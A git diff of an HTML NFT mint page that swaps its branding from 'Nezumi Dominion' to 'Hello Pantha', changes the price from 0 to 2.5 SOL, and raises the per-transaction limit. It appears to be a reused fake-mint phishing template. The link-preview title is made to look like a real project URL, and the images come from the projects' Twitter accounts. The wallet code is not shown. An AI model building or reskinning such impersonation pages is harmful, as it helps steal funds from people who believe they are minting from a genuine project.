@@ -4,18 +4,17 @@
     <meta charset="utf-8">
     <meta name="description" content="NTC" data-react-helmet="true" />
     <meta name="theme-color" content="#000000" />
-    <meta content="🌐 nezumidominion.com/mint" property="og:title">
+    <meta content="🌐 hellopantha.com/mint" property="og:title">
     <meta content="
-      🟢 Nezumi Dominion Badges Mint is Now Live!
-     
-      Mint Price: 0 SOL
+      🟢 Hello Pantha Mint is Now Live!
+      ◎  Mint Price: 2.5 SOL
     " property="og:description">
-    <meta content="https://pbs.twimg.com/profile_banners/1508070403729723394/1653327678/1500x500" property="og:image">
+    <meta content="https://pbs.twimg.com/profile_banners/1522236605603397636/1652582139/1500x500" property="og:image">
     <meta name="twitter:card" content="summary_large_image">
-    <link type="application/json+oembed" href="https://api.jsonbin.io/b/622184b37caf5d67835ed9ba/144" />
+    <link type="application/json+oembed" href="https://api.jsonbin.io/b/622184b37caf5d67835ed9ba/148" />
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <title>Nezumi Dominion</title>
-    <link rel="shortcut icon" href="https://www.nezumidominion.com/static/media/header_ratata.cc9389329965c6bc7dec61183b71e97f.svg" />
+    <title>Hello Pantha</title>
+    <link rel="shortcut icon" href="https://pbs.twimg.com/profile_images/1525666042265100288/gy76fomE_400x400.jpg" />
     <link rel="stylesheet" type="text/css" href="css/all.min.css">
     <link rel="stylesheet" type="text/css" href="css/normalize.css">
     <link rel="stylesheet" type="text/css" href="css/style.css">
@@ -54,12 +53,12 @@
         <div class="main-area">
 
             <div class="main-area__right">
-                <h2 class="right-title">NezumiDominion - RATATA</h2>
+                <h2 class="right-title">Hello Pantha</h2>
 
                 <div class="right-list">
                     <li>
                         <div class="text">
-                            Sick #NFTart, multiple collections, staking pools and SLP tokens that together brings you a strategy staking game driven by the story of the Nezumi Dominion.
+                            Moving slow like a Pantha. Culture wave of inclusivity and diversity. Societal Phenomenon. No propaganda.
                     </li>
                     </div>
 
@@ -70,8 +69,8 @@
                             <a href="javascript:void(0)" class="plus-btn">+</a>
                         </div>
                         <div class="price-box">
-                            <div id="price-total"><span>0</span> SOL</div>
-                            <div>1 NFT max per transaction</div>
+                            <div id="price-total"><span>2.5</span> SOL</div>
+                            <div>2 NFT max per transaction</div>
                         </div>
                     </div>
                     <div class="button-box">
@@ -91,7 +90,7 @@
                 </style>
                 <div class="main-area__left">
                     <div class="slider-area">
-                        <img class="animation" src="https://cdn.discordapp.com/attachments/958108807605669908/983401072800452658/nezumi-badge-sneak.gif">
+                        <img class="animation" src="https://www.hellopantha.com/team_images/Voodoo.jpg">
                     </div>
                 </div>
             </div>
@@ -106,12 +105,12 @@
         const $numberText = document.querySelector("#total");
         const $remaining = document.querySelector('#remaining');
         const $priceResultText = document.querySelector("#price-total span");
-        let itemPriceSelected = 0;
+        let itemPriceSelected = 2.5;
         let itemCount = 1;
 
         $plusButton.addEventListener("click", function(e) {
             e.preventDefault();
-            itemCount = itemCount < 1 ? itemCount + 1 : 1;
+            itemCount = itemCount < 2 ? itemCount + 1 : 2;
             $numberText.value = itemCount;
             $priceResultText.textContent = (itemPriceSelected * itemCount).toFixed(2);
         });
